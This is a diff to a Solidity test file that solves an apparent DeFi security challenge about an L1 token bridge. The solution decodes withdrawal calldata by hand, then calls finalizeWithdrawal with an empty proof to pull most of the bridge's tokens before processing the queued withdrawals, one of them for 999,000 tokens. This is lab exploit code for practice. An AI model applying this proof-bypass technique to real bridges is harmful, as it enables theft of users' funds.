@@ -89,7 +89,227 @@ contract WithdrawalChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_withdrawal() public checkSolvedByPlayer {
+        skip(7 days);
+        /**
+        1.
+
+        id
+        eaebef7f15fdaa66 
+        ecd4533eefea23a1
+        83ced29967ea67bc
+        4219b0f1f8b0d3ba
         
+        timestamp
+        0000000000000000
+        0000000000000000
+        0000000000000000
+        0000000066729b63
+        
+        offset
+        0000000000000000
+        0000000000000000
+        0000000000000000
+        0000000000000060
+        
+        L1Forwarder.forwardMessage.selector  forwardMessage(uint256 nonce, address l2Sender, address target, bytes memory message)
+        0000000000000000
+        0000000000000000
+        0000000000000000
+        000000000000010401210a38
+        
+        nonce
+        0000000000000000
+        0000000000000000
+        0000000000000000
+        0000000000000000
+        
+        l2Sender
+        0000000000000000
+        00000000328809bc
+        894f92807417d2da
+        d6b7c998c1afdac6
+        
+        target
+        0000000000000000
+        000000009c52b2c4
+        a89e2be37972d18d
+        a937cbad8aa8bd50
+        
+        offset
+        0000000000000000
+        0000000000000000
+        0000000000000000
+        0000000000000080
+        
+        length
+        0000000000000000
+        0000000000000000
+        0000000000000000
+        0000000000000044
+
+        TokenBridge.executeTokenWithdrawal.selector
+        81191e51
+        
+        receiver
+        00000000000000000
+        0000000328809bc89
+        4f92807417d2dad6b
+        7c998c1afdac60000
+        
+        amount (10ether)
+        0000000000000000
+        0000000000000000
+        0000000000008ac7
+        230489e800000000
+        
+        0000000000000000
+        0000000000000000
+        0000000000000000
+        0000000000000000
+        0000000000000000
+        0000000000000000
+        000000000000
+        */
+
+        /**
+        2. 
+        amount (10ether)
+        0000000000000000
+        0000000000000000
+        0000000000000000
+        8ac7230489e80000
+
+        3. 
+        (999000ether)
+        0000000000000000
+        00000000ea475d60
+        c118d7058bef4bdd
+        9c32ba51139a74e0
+        
+        4.
+        amount (10ether)
+        0000000000000000
+        0000000000000000
+        0000000000000000
+        8ac7230489e80000        
+        */
+        
+        bytes memory message = abi.encodeCall( L1Forwarder.forwardMessage,
+            (
+                0,
+                player, 
+                address(l1TokenBridge), 
+                abi.encodeCall( 
+                    TokenBridge.executeTokenWithdrawal,
+                    (
+                        player, 
+                        token.balanceOf(address(l1TokenBridge)) - 30 ether
+                    )
+                )
+            )
+        );
+
+        l1Gateway.finalizeWithdrawal({
+            nonce: 0,
+            l2Sender: l2Handler,
+            target: address(l1Forwarder),
+            timestamp: block.timestamp - 7 days,
+            message: message,
+            proof: new bytes32[](0)
+        });
+
+
+        skip(7 days);
+
+        l1Gateway.finalizeWithdrawal({
+            nonce: 0,
+            l2Sender: 0x87EAD3e78Ef9E26de92083b75a3b037aC2883E16,
+            target: 0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5,
+            timestamp: 1718786915,
+            message: abi.encodeCall( L1Forwarder.forwardMessage,
+            (
+                0,
+                0x328809Bc894f92807417D2dAD6b7C998c1aFdac6, 
+                0x9c52B2C4A89E2BE37972d18dA937cbAd8AA8bd50, 
+                abi.encodeCall( 
+                    TokenBridge.executeTokenWithdrawal,
+                    ( 
+                        0x328809Bc894f92807417D2dAD6b7C998c1aFdac6,
+                        10 ether
+                    )
+                )
+            )
+            ),
+            proof: new bytes32[](0)
+        });
+        
+        l1Gateway.finalizeWithdrawal({
+            nonce: 1,
+            l2Sender: 0x87EAD3e78Ef9E26de92083b75a3b037aC2883E16,
+            target: 0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5,
+            timestamp: 1718786965,
+            message: abi.encodeCall( L1Forwarder.forwardMessage,
+            (
+                1,
+                0x1D96F2f6BeF1202E4Ce1Ff6Dad0c2CB002861d3e, 
+                0x9c52B2C4A89E2BE37972d18dA937cbAd8AA8bd50, 
+                abi.encodeCall( 
+                    TokenBridge.executeTokenWithdrawal,
+                    ( 
+                        0x1D96F2f6BeF1202E4Ce1Ff6Dad0c2CB002861d3e,
+                        10 ether
+                    )
+                )
+            )
+            ),
+            proof: new bytes32[](0)
+        });
+
+        l1Gateway.finalizeWithdrawal({
+            nonce: 2,
+            l2Sender: 0x87EAD3e78Ef9E26de92083b75a3b037aC2883E16,
+            target: 0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5,
+            timestamp: 1718787050,
+            message: abi.encodeCall( L1Forwarder.forwardMessage,
+            (
+                2,
+                0xea475d60c118d7058beF4bDd9c32bA51139a74e0, 
+                0x9c52B2C4A89E2BE37972d18dA937cbAd8AA8bd50, 
+                abi.encodeCall( 
+                    TokenBridge.executeTokenWithdrawal,
+                    ( 
+                        0xea475d60c118d7058beF4bDd9c32bA51139a74e0,
+                        999000 ether
+                    )
+                )
+            )
+            ),
+            proof: new bytes32[](0)
+        });
+
+        l1Gateway.finalizeWithdrawal({
+            nonce: 3,
+            l2Sender: 0x87EAD3e78Ef9E26de92083b75a3b037aC2883E16,
+            target: 0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5,
+            timestamp: 1718787127,
+            message: abi.encodeCall( L1Forwarder.forwardMessage,
+            (
+                3,
+                0x671d2ba5bF3C160A568Aae17dE26B51390d6BD5b, 
+                0x9c52B2C4A89E2BE37972d18dA937cbAd8AA8bd50, 
+                abi.encodeCall( 
+                    TokenBridge.executeTokenWithdrawal,
+                    ( 
+                        0x671d2ba5bF3C160A568Aae17dE26B51390d6BD5b,
+                        10 ether
+                    )
+                )
+            )
+            ),
+            proof: new bytes32[](0)
+        });
+
+        token.transfer(address(l1TokenBridge), token.balanceOf(player));
     }
 
     /**
